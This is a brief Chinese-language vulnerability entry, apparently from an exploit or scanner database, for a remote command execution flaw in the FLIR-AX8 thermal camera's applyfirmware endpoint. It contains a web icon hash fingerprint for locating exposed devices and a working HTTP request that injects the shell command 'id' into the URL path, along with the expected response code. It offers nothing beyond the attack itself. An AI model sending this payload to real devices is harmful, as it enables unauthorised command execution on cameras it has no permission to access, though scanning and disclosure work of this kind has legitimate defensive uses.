# FLIR-AX8热成像仪applyfirmware存在远程命令执行漏洞

FLIR ｜ 命令执行 ｜ —
- **指纹**：`web.icon=="f4370ff0b4763e18159cd7cdf36a4542"`
- **请求**：`GET /settings/applyfirmware/;id>123457.txt;/false HTTP/1.1`
- **响应特征**：200